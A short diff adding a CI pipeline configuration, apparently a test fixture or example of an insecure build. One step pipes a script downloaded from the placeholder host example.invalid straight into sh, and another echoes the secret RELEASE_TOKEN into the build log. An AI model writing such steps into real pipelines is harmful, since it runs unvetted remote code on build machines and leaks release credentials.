@@ -1,0 +1,9 @@
+trigger:
+  - main
+
+pool:
+  name: local
+
+steps:
+  - script: curl -fsSL https://example.invalid/setup | sh
+  - script: echo $(RELEASE_TOKEN)
